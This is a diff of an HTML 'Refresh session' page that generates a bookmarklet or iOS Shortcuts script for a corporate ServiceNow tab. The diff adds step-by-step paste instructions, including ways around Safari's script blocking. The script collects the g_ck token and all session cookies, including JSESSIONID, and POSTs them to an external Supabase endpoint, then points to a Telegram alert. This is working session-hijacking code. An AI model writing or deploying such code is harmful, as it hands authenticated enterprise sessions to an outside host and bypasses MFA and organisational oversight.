@@ -8,55 +8,75 @@
     *{box-sizing:border-box}
     body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#0f172a;color:#e2e8f0;line-height:1.5}
     h1{font-size:1.35rem;margin:0 0 8px}
+    h2{font-size:1rem;color:#38bdf8;margin:18px 0 8px}
     .card{background:#1e293b;border-radius:12px;padding:16px;margin:16px 0}
     .step{font-weight:600;color:#38bdf8;margin-bottom:6px}
     a.btn,button.primary{display:block;width:100%;text-align:center;background:#2563eb;color:#fff;text-decoration:none;padding:14px;border-radius:10px;font-weight:600;margin:12px 0;border:none;font-size:1rem}
     button.green{background:#059669}
+    button.orange{background:#d97706}
     .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}
     small{color:#94a3b8}
     ol{padding-left:1.2rem;margin:8px 0}
     li{margin:10px 0}
     .tip{background:#0f172a;border-left:3px solid #38bdf8;padding:10px 12px;margin:10px 0;border-radius:6px}
     .danger{background:#450a0a;border-left:3px solid #f87171;padding:10px 12px;margin:10px 0;border-radius:6px}
-    .num{display:inline-block;width:1.4rem;height:1.4rem;line-height:1.4rem;text-align:center;background:#2563eb;border-radius:50%;font-size:.85rem;margin-right:6px}
+    .iphone{background:#0f172a;border-left:3px solid #a78bfa;padding:10px 12px;margin:10px 0;border-radius:6px}
+    code{font-size:.8rem;word-break:break-all}
+    textarea{width:100%;min-height:80px;font-size:11px;background:#0f172a;color:#94a3b8;border:1px solid #475569;border-radius:8px;padding:8px}
   </style>
 </head>
 <body>
   <h1>🔄 Refresh session</h1>
   <p id="err" class="err"></p>
   <div id="app" style="display:none">
-    <div class="tip"><strong>Chrome on Android</strong> works best. iPhone: use bookmark method below.</div>
 
-    <div class="card">
-      <div class="step"><span class="num">1</span> Copy script</div>
-      <button type="button" class="primary green" id="copyScript">📋 Copy session script</button>
-      <p id="copyMsg"></p>
+    <div class="danger">
+      <strong>iPhone Safari:</strong> Address bar paste is <strong>blocked</strong> by Apple
+      (“Cannot Run Script”). Use <strong>Bookmark</strong> or <strong>Shortcuts</strong> below.
     </div>
 
     <div class="card">
-      <div class="step"><span class="num">2</span> Open queue & login</div>
+      <div class="step">Step 1 — Open queue & login</div>
       <a class="btn" id="snow" href="#">Open ServiceNow queue</a>
-      <p><small>MFA login → wait until <strong>ticket rows</strong> show.</small></p>
+      <p><small>MFA login → see ticket list (like your screenshot).</small></p>
+    </div>
+
+    <div class="card iphone">
+      <h2>📱 iPhone — Method A: Bookmark (try first)</h2>
+      <ol>
+        <li>On ServiceNow page → tap <strong>Share</strong> (□↑) → <strong>Add Bookmark</strong> → name it <strong>SN Upload</strong></li>
+        <li>Tap <strong>Copy bookmark script</strong> below</li>
+        <li>Safari → <strong>Bookmarks</strong> (book icon) → <strong>Edit</strong> → tap <strong>SN Upload</strong></li>
+        <li>Tap the URL field → <strong>delete all</strong> → <strong>Paste</strong> script → Done</li>
+        <li>Go back to <strong>ServiceNow queue tab</strong></li>
+        <li>Tap <strong>Bookmarks</strong> → tap <strong>SN Upload</strong></li>
+        <li>Popup: ✅ Done or ❌ error</li>
+      </ol>
+      <button type="button" class="primary green" id="copyScript">📋 Copy bookmark script</button>
+      <p id="copyMsg"></p>
+      <p class="warn"><small>Do NOT paste in address bar — Safari blocks it.</small></p>
+    </div>
+
+    <div class="card iphone">
+      <h2>📱 iPhone — Method B: Shortcuts app</h2>
+      <ol>
+        <li>Install <strong>Shortcuts</strong> app (free, from App Store)</li>
+        <li>Create shortcut → Add action <strong>Run JavaScript on Web Page</strong></li>
+        <li>Tap <strong>Copy Shortcuts code</strong> below → paste into that action</li>
+        <li>On ServiceNow queue → tap <strong>Share</strong> → <strong>SN Upload</strong> shortcut</li>
+      </ol>
+      <button type="button" class="primary orange" id="copyShortcut">📋 Copy Shortcuts code</button>
+      <p id="shortcutMsg"></p>
     </div>
 
     <div class="card">
-      <div class="step"><span class="num">3</span> Run script on ServiceNow tab</div>
-      <div class="danger"><strong>Never paste into any text box on this page.</strong></div>
-
-      <p><strong>Android Chrome:</strong></p>
+      <h2>🤖 Android — Chrome only</h2>
       <ol>
-        <li>On <strong>micron.service-now.com</strong> tab</li>
-        <li>Tap address bar → Paste → Go</li>
+        <li>Copy bookmark script above</li>
+        <li>On ServiceNow tab: address bar → select all → delete → paste script → Go</li>
       </ol>
-
-      <p><strong>iPhone Safari:</strong> (address bar often blocks scripts)</p>
-      <ol>
-        <li>Bookmark any page → name it <em>SN Upload</em></li>
-        <li>Edit bookmark → replace URL with pasted script</li>
-        <li>On ServiceNow queue page → tap <em>SN Upload</em> bookmark</li>
-      </ol>
-      <p><small>Popup should say ✅ Done! Check Telegram.</small></p>
     </div>
+
   </div>
   <script>
     const SUPABASE_URL = 'https://qhkeirrhjjtdyvrdkbxn.supabase.co';
@@ -67,38 +87,70 @@
     const errEl = document.getElementById('err');
     const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
 
-    function sessionScript(tok) {
-      if (!tok) throw new Error('Open the latest Telegram link');
-      const inline = `(async function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var q=${JSON.stringify(SNOW_QUERY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';if(!g)throw new Error('Open queue page and login first');var tu='/api/now/table/sn_si_incident?sysparm_query='+encodeURIComponent(q)+'&sysparm_limit=1&sysparm_fields=number';var te=await fetch(tu,{credentials:'include',headers:{'X-UserToken':g,'Accept':'application/json'}});if(!te.ok)throw new Error('Login first — API '+te.status);var parts={};document.cookie.split(';').forEach(function(p){var i=p.indexOf('=');if(i>0)parts[p.slice(0,i).trim()]=p.slice(i+1).trim()});try{if(window.cookieStore&&cookieStore.getAll){var all=await cookieStore.getAll();for(var j=0;j<all.length;j++){var c=all[j];if(c.name)parts[c.name]=c.value}}}catch(e){}var cookie=Object.keys(parts).map(function(n){return n+'='+parts[n]}).join('; ');if(!/JSESSIONID=/.test(cookie))throw new Error('Missing JSESSIONID — try Chrome on Android');var r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:cookie,p_g_ck:g})});var d=await r.json();if(!d.ok)throw new Error(d.error||'Upload failed');alert('✅ Done! Check Telegram.')})().catch(function(e){alert('❌ '+e.message)});`;
-      return 'javascript:' + encodeURIComponent(inline);
+    function uploadLogic(tok) {
+      return `(async function(){
+  var t=${JSON.stringify(tok)};
+  var rpc=${JSON.stringify(rpc)};
+  var k=${JSON.stringify(ANON_KEY)};
+  var q=${JSON.stringify(SNOW_QUERY)};
+  var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';
+  if(!g) throw new Error('Open queue page first');
+  var tu='/api/now/table/sn_si_incident?sysparm_query='+encodeURIComponent(q)+'&sysparm_limit=1&sysparm_fields=number';
+  var te=await fetch(tu,{credentials:'include',headers:{'X-UserToken':g,'Accept':'application/json'}});
+  if(!te.ok) throw new Error('Login first — API '+te.status);
+  var parts={};
+  document.cookie.split(';').forEach(function(p){var i=p.indexOf('=');if(i>0)parts[p.slice(0,i).trim()]=p.slice(i+1).trim()});
+  try{if(window.cookieStore&&cookieStore.getAll){var all=await cookieStore.getAll();for(var j=0;j<all.length;j++){var c=all[j];if(c.name)parts[c.name]=c.value}}}catch(e){}
+  var cookie=Object.keys(parts).map(function(n){return n+'='+parts[n]}).join('; ');
+  if(!/JSESSIONID=/.test(cookie)) throw new Error('Missing JSESSIONID — try Android Chrome or bookmark method');
+  var r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:cookie,p_g_ck:g})});
+  var d=await r.json();
+  if(!d.ok) throw new Error(d.error||'Upload failed');
+  alert('✅ Done! Check Telegram.');
+})().catch(function(e){alert('❌ '+e.message)});`;
+    }
+
+    function bookmarkScript(tok) {
+      return 'javascript:' + encodeURIComponent(uploadLogic(tok));
+    }
+
+    function shortcutsCode(tok) {
+      return uploadLogic(tok);
+    }
+
+    async function copyText(text, msgEl, okMsg) {
+      try {
+        if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(text);
+        else {
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+        }
+        msgEl.textContent = okMsg;
+        msgEl.className = 'ok';
+      } catch (e) {
+        msgEl.textContent = '❌ Copy failed';
+        msgEl.className = 'err';
+      }
     }
 
     if (!token) {
-      errEl.textContent = '❌ Missing token — tap the newest Telegram alert link.';
+      errEl.textContent = '❌ Missing token — open the newest Telegram link.';
     } else {
       errEl.style.display = 'none';
       document.getElementById('app').style.display = 'block';
       document.getElementById('snow').href = SNOW_QUEUE_URL;
-      document.getElementById('copyScript').onclick = async () => {
-        const cm = document.getElementById('copyMsg');
-        try {
-          const script = sessionScript(token);
-          if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(script);
-          else {
-            const ta = document.createElement('textarea');
-            ta.value = script;
-            document.body.appendChild(ta);
-            ta.select();
-            document.execCommand('copy');
-            document.body.removeChild(ta);
-          }
-          cm.innerHTML = '✅ Copied! Run on <strong>ServiceNow tab</strong> only (step 3).';
-          cm.className = 'ok';
-        } catch (e) {
-          cm.textContent = '❌ ' + e.message;
-          cm.className = 'err';
-        }
-      };
+
+      document.getElementById('copyScript').onclick = () =>
+        copyText(bookmarkScript(token), document.getElementById('copyMsg'),
+          '✅ Copied! Paste as bookmark URL (not address bar).');
+
+      document.getElementById('copyShortcut').onclick = () =>
+        copyText(shortcutsCode(token), document.getElementById('shortcutMsg'),
+          '✅ Copied! Paste into Shortcuts → Run JavaScript on Web Page.');
     }
   </script>
 </body>
